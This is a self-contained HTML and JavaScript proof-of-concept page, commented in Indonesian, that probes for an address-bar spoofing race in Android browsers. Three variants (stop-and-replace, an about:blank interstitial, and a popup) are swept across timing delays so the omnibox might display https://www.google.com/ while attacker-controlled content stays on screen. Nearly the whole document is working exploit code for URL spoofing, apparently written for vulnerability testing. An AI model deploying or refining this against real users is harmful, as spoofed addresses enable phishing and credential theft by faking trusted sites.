<!doctype html>
<meta charset="utf-8">
<title>Android Omnibox Desync Race — google.com</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  body{font:14px/1.5 system-ui,sans-serif;margin:0}
  .attacker{position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0f172a;color:#e2e8f0}
  .attacker h1{margin:0 0 8px}
  .attacker code{background:#111827;padding:2px 6px;border-radius:6px}
  .log{position:fixed;left:0;right:0;bottom:0;max-height:36vh;overflow:auto;background:#f3f4f6;color:#111;font:12px ui-monospace,monospace;padding:8px}
  button{padding:.6rem 1rem;border:0;border-radius:10px;background:#2563eb;color:#fff;font-weight:600;cursor:pointer}
</style>

<div class="attacker" id="attacker">
  <h1>ATTACKER CONTENT</h1>
  <p>Jika browser rentan, omnibox bisa menampilkan <code>https://www.google.com/</code> sementara area ini masih terlihat.</p>
  <button id="run">Run Race</button>
</div>
<pre class="log" id="log"></pre>

<script>
const log = (m)=>document.getElementById('log').textContent += m + "\n";

function smallNetActivity(){
  // bikin sedikit network activity biar ada state "loading"
  new Image().src = "https://www.google.com/favicon.ico?x=" + Math.random();
}

function variantSameTab(delay){
  // Pola A: stop cepat → replace ke google → stop → replace ulang
  smallNetActivity();
  setTimeout(()=>{ try{window.stop();}catch(e){} }, delay);
  setTimeout(()=>{ location.replace("https://www.google.com/"); }, delay+10);
  setTimeout(()=>{ try{window.stop();}catch(e){} }, delay+120);
  setTimeout(()=>{ location.replace("https://www.google.com/"); }, delay+180);
}

function variantAboutBlank(delay){
  // Pola B: about:blank interstitial → google (pernah memicu desync di beberapa kasus mobile)
  smallNetActivity();
  setTimeout(()=>{ try{window.stop();}catch(e){} }, delay);
  setTimeout(()=>{ location.href = "about:blank"; }, delay+20);
  setTimeout(()=>{ try{window.stop();}catch(e){} }, delay+40);
  setTimeout(()=>{ location.href = "https://www.google.com/"; }, delay+90);
}

function variantPopup(delay){
  // Pola C: buka tab/window lain lalu fokus balik, kadang UI update telat
  smallNetActivity();
  setTimeout(()=>{ try{window.stop();}catch(e){} }, delay);
  setTimeout(()=>{
    const w = window.open("about:blank","_blank");
    if (w) {
      w.location.href = "https://www.google.com/";
      setTimeout(()=>{ try{ w.focus(); }catch(e){} }, 60);
      setTimeout(()=>{ try{ window.focus(); }catch(e){} }, 140);
    }
  }, delay+30);
}

async function runRace(){
  document.getElementById('run').disabled = true;
  const delays = [80,120,160,220,300,380,460,600,750,900]; // sweep timing
  for (const d of delays){
    log(`[i] delay=${d}ms — variant A`);
    variantSameTab(d);
    await new Promise(r=>setTimeout(r, 900));

    log(`[i] delay=${d}ms — variant B`);
    variantAboutBlank(d);
    await new Promise(r=>setTimeout(r, 900));

    log(`[i] delay=${d}ms — variant C`);
    variantPopup(d);
    await new Promise(r=>setTimeout(r, 900));
  }
  log("[✓] selesai sweep. Jika tidak ada desync terlihat, kemungkinan browser tidak terdampak pola ini.");
}

document.getElementById('run').onclick = runRace;

// indikator kuat bahwa DOM masih attacker: kita update timestamp di layar
setInterval(()=>{
  const el = document.getElementById('attacker');
  if (el) el.querySelector('h1').textContent = "ATTACKER CONTENT — " + new Date().toLocaleTimeString();
}, 250);
</script>
